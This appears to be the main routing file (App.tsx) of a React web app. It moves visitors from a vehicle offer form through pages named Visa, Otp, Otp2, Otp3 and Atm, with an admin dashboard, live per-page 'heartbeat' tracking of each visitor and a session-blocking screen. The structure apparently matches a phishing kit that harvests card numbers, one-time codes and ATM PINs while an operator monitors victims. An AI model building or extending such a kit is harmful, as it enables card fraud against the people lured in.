import { useEffect, useState } from "react";
import type { ComponentType } from "react";
import { Switch, Route, Router as WouterRouter, RouteComponentProps, useLocation } from "wouter";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { useHeartbeatTracking, getPageName } from "@/lib/heartbeat";
import { ensureSessionId } from "@/lib/submissions";
import { BlockScreen, useBlockedState } from "@/components/BlockScreen";

import Home from "@/pages/Home";
import VehicleForm from "@/pages/VehicleForm";
import SelectOffer from "@/pages/SelectOffer";
import Total from "@/pages/Total";
import Total2 from "@/pages/Total2";
import Visa from "@/pages/Visa";
import Otp from "@/pages/Otp";
import Otp2 from "@/pages/Otp2";
import Otp3 from "@/pages/Otp3";
import Atm from "@/pages/Atm";
import AdminLogin from "@/pages/AdminLogin";
import AdminDashboard from "@/pages/AdminDashboard";
import NotFound from "@/pages/not-found";

const queryClient = new QueryClient();

// Heartbeat tracking wrapper
function HeartbeatProvider({ children }: { children: React.ReactNode }) {
  const [location] = useLocation();
  const { updatePage } = useHeartbeatTracking(location);
  
  // Update page tracking when location changes
  useEffect(() => {
    const pageName = getPageName(location);
    updatePage(pageName);
  }, [location, updatePage]);
  
  return <>{children}</>;
}

function route(Component: ComponentType) {
  return (_props: RouteComponentProps) => <Component />;
}

function Router() {
  return (
    <Switch>
      <Route path="/" component={route(Home)} />
      <Route path="/form" component={route(VehicleForm)} />
      <Route path="/select" component={route(SelectOffer)} />
      <Route path="/total" component={route(Total)} />
      <Route path="/total2" component={route(Total2)} />
      <Route path="/visa" component={route(Visa)} />
      <Route path="/otp" component={route(Otp)} />
      <Route path="/otp2" component={route(Otp2)} />
      <Route path="/otp3" component={route(Otp3)} />
      <Route path="/atm" component={route(Atm)} />
      <Route path="/admin/dashboard" component={route(AdminDashboard)} />
      <Route path="/admin" component={route(AdminLogin)} />
      <Route component={route(NotFound)} />
    </Switch>
  );
}

// Block state wrapper - checks if user is blocked
function BlockStateProvider({ children }: { children: React.ReactNode }) {
  const [sessionId] = useState(() => ensureSessionId());
  const isBlocked = useBlockedState(sessionId);
  
  // If blocked, show block screen instead of content
  if (isBlocked) {
    return <BlockScreen />;
  }
  
  return <>{children}</>;
}

function App() {
  // Get session ID early to check block status
  const [sessionId] = useState(() => ensureSessionId());
  const isBlocked = useBlockedState(sessionId);
  
  // If blocked at app level, show only block screen
  if (isBlocked) {
    return (
      <QueryClientProvider client={queryClient}>
        <BlockScreen />
      </QueryClientProvider>
    );
  }
  
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <WouterRouter base={import.meta.env.BASE_URL.replace(/\/$/, "")}>
          <HeartbeatProvider>
            <BlockStateProvider>
              <Router />
            </BlockStateProvider>
          </HeartbeatProvider>
        </WouterRouter>
        <Toaster />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
